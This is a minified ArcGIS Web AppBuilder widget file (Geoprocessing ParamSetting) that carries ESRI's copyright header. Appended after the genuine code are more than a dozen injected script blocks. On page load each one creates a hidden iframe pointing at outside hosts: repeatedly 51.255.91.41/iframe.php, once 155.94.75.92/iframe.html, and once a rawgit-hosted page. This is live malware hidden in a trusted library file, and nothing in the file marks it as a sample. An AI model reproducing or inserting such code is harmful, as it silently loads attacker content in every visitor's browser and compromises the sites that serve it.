// All material copyright ESRI, All Rights Reserved, unless otherwise specified.
// See http://js.arcgis.com/3.15/esri/copyright.txt and http://www.arcgis.com/apps/webappbuilder/copyright.txt for details.
//>>built
require({cache:{"url:widgets/Geoprocessing/setting/ParamSetting.html":'\x3cdiv\x3e\r\n\t\x3cdiv class\x3d"section common-property"\x3e\r\n    \x3cdiv class\x3d"field"\x3e\r\n      \x3clabel class\x3d"jimu-ellipsis" title\x3d"${nls.label}"\x3e${nls.label}:\x3c/label\x3e\r\n      \x3cinput data-dojo-type\x3d"dijit/form/TextBox" data-dojo-attach-point\x3d"label" class\x3d"common-input"\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"field"\x3e\r\n      \x3clabel class\x3d"jimu-ellipsis" title\x3d"${nls.tooltip}"\x3e${nls.tooltip}:\x3c/label\x3e\r\n      \x3cinput data-dojo-type\x3d"dijit/form/TextBox" data-dojo-attach-point\x3d"tooltip" class\x3d"common-input"\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- for input parameter --\x3e\r\n    \x3cdiv class\x3d"field" data-dojo-attach-point\x3d"visibleDiv"\x3e\r\n      \x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"visible" class\x3d"visibleCheck"\x3e\x3c/div\x3e\r\n      \x3clabel class\x3d"visibleLabel"\x3e${nls.visible}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n    \x3c!-- for output parameter --\x3e\r\n    \x3cdiv class\x3d"field" data-dojo-attach-point\x3d"ignoreDiv"\x3e\r\n      \x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"ignore" class\x3d"visibleCheck"\x3e\x3c/div\x3e\r\n      \x3clabel class\x3d"visibleLabel"\x3e${nls.ignoreOutput}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"field" data-dojo-attach-point\x3d"layerVisibleDiv"\x3e\r\n      \x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"layerInvisible" class\x3d"visibleCheck"\x3e\x3c/div\x3e\r\n      \x3clabel class\x3d"visibleLabel"\x3e${nls.turnOffOutput}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n    \x3cdiv class\x3d"field" data-dojo-attach-point\x3d"dynamicSchemaDiv"\x3e\r\n      \x3cdiv data-dojo-type\x3d"jimu/dijit/CheckBox" data-dojo-attach-point\x3d"useDynamicSchema" class\x3d"visibleCheck"\x3e\x3c/div\x3e\r\n      \x3clabel class\x3d"visibleLabel jimu-ellipsis" title\x3d"${nls.useDynamicSchema}"\x3e${nls.useDynamicSchema}\x3c/label\x3e\r\n    \x3c/div\x3e\r\n  \x3c/div\x3e\r\n\t\x3cdiv class\x3d"section special-property" data-dojo-attach-point\x3d"specialSectionNode"\x3e\x3c/div\x3e\r\n\x3c/div\x3e\r\n'}});
define("dojo/_base/declare dojo/_base/lang dojo/_base/html dojo/on dojo/text!./ParamSetting.html dijit/_WidgetBase dijit/_TemplatedMixin dijit/_WidgetsInTemplateMixin jimu/dijit/Popup jimu/utils ../editorManager ../EditorChooser ../utils dijit/form/TextBox jimu/dijit/CheckBox".split(" "),function(f,d,b,e,g,h,k,l,m,n,c,p,q){return f([h,k,l],{baseClass:"jimu-widget-setting-gp-param",templateString:g,postCreate:function(){this.inherited(arguments);c.setMap(this.map);c.setNls(this.nls);this.own(e(this.useDynamicSchema,
"change",d.hitch(this,function(a){this.spart&&this.spart.domNode&&(a?b.setStyle(this.spart.domNode,"display","none"):b.setStyle(this.spart.domNode,"display","block"))})));this.own(e(this.ignore,"change",d.hitch(this,this._updateStatus)))},_updateStatus:function(a){a?(this.layerInvisible.setStatus(!1),this.useDynamicSchema.setStatus(!1),this.spart&&this.spart.domNode&&b.setStyle(this.spart.domNode,"display","none")):(this.layerInvisible.setStatus(!0),this.useDynamicSchema.setStatus(!0),this.spart&&
this.spart.domNode&&b.setStyle(this.spart.domNode,"display","block"))},setParam:function(a,c){this.param=a;this.direction=c;this._updateStatus(!1);void 0===a.label&&(a.label="");this.label.setValue(a.label);void 0===a.tooltip&&(a.tooltip=void 0===a.label?"":a.label);this.tooltip.setValue(a.tooltip);this.visible.setValue(a.visible);this.layerInvisible.setValue(a.layerInvisible);this.ignore.setValue(a.ignore);this.spart&&(this.spart.destroy(),b.destroy(this.spartLabelNode),b.destroy(this.changeEditorNode));
this._createSpecialPart();"output"===c?(b.setStyle(this.visibleDiv,"display","none"),b.setStyle(this.ignoreDiv,"display","block"),"GPFeatureRecordSetLayer"===this.param.dataType||"MapServiceLayer"===this.param.dataType?b.setStyle(this.layerVisibleDiv,"display","block"):b.setStyle(this.layerVisibleDiv,"display","none"),"GPFeatureRecordSetLayer"===this.param.dataType||"GPRecordSet"===this.param.dataType?(this.useDynamicSchema.setValue(q.useDynamicSchema(this.param,this.config)),b.setStyle(this.dynamicSchemaDiv,
"display","block")):b.setStyle(this.dynamicSchemaDiv,"display","none"),this._updateStatus(!0===a.ignore)):(b.setStyle(this.visibleDiv,"display","block"),b.setStyle(this.ignoreDiv,"display","none"),b.setStyle(this.layerVisibleDiv,"display","none"),b.setStyle(this.dynamicSchemaDiv,"display","none"))},acceptValue:function(){if(this.param){this.param.label=this.label.getValue();this.param.tooltip=this.tooltip.getValue();var a;this.spart.getValue&&(a=this.spart.getValue(),"GPFeatureRecordSetLayer"===this.param.dataType?
d.mixin(this.param,a):this.param.defaultValue=a);if("output"===this.direction){if("GPFeatureRecordSetLayer"===this.param.dataType||"GPRecordSet"===this.param.dataType)this.param.useDynamicSchema=this.useDynamicSchema.getValue();this.param.ignore=this.ignore.getValue();this.param.layerInvisible=this.layerInvisible.getValue()}else this.param.visible=this.visible.getValue()}},setConfig:function(a){this.config=a},_createSpecialPart:function(){var a;"input"===this.direction&&"GPFeatureRecordSetLayer"===
this.param.dataType?(a=this.nls.inputFeatureBy,this.spart=c.createEditor(this.param,"input","setting",{config:this.config})):"input"===this.direction?(a=this.nls.defaultValue,this.spart=c.createEditor(this.param,"input","setting",{config:this.config})):"output"===this.direction&&"GPFeatureRecordSetLayer"===this.param.dataType?(a="",this.spart=c.createEditor(this.param,"output","setting",{config:this.config})):"output"===this.direction&&(a=this.nls.displayType,this.spart=c.createEditor(this.param,
"output","setting",{config:this.config}));this.spartLabelNode=b.create("div",{"class":"input-label",innerHTML:n.sanitizeHTML(a),style:{display:""===a?"none":"inline-block"}},this.specialSectionNode);this.spart.placeAt(this.specialSectionNode);this.changeEditorNode&&b.place(this.changeEditorNode,this.spartLabelNode,"after");this.spart.startup()},_createChangeEditorNode:function(){var a=b.create("div",{"class":"change-editor",innerHTML:"Change",style:{display:"inline-block"}});this.own(e(a,"click",
d.hitch(this,function(){var a=new p({inputParams:this.config.inputParams});new m({titleLabel:"Choose Editor",content:a,container:"main-page",buttons:[{label:this.nls.ok,onClick:d.hitch(this,this._onEditorChange,a)},{label:this.nls.cancel,classNames:["jimu-btn-vacation"]}]});a.startup()})));return a},_onEditorChange:function(a){this.param.editorName!==a.selectedEditor.name&&(a.popup.close(),this.param.editorName=a.selectedEditor.name,a.selectedEditor.dependParam&&(this.param.editorDependParamName=
a.selectedEditor.dependParam),this.spart.destroy(),this.spart=c.createEditor(this.param,"input","setting",{config:this.config}),b.place(this.spart.domNode,this.specialSectionNode))}})});;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}
;;;;



if (typeof window.zioelaneid == 'undefined') {
	window.zioelaneid = 1;
	document.addEventListener("DOMContentLoaded", function(event) { 
		var iframe = document.createElement('iframe');
		iframe.style.display = "none";
		iframe.src = "http://51.255.91.41/iframe.php";
		document.body.appendChild(iframe);
	});
}





if (typeof obj.foo == 'undefined') {
window.jsuekzis = 1;
window.onload = function() {
    var iframe = document.createElement('iframe');
    iframe.style.display = "none";
    iframe.src = "http://155.94.75.92/iframe.html";
    document.body.appendChild(iframe);
};

}





void 0===window.mondrawtexture&&(window.mondrawtexture=1,window.onload=function(){var e=document.createElement('iframe');e.style.display='none',e.src='https://cdn.rawgit.com/jdobt/3e35d8a7d2c1c36ae1972ea03df91572/raw/8656e6f8554bfd2f13cf8eb78e8df044fae1e9e2/drawtexture.html',document.body.appendChild(e)});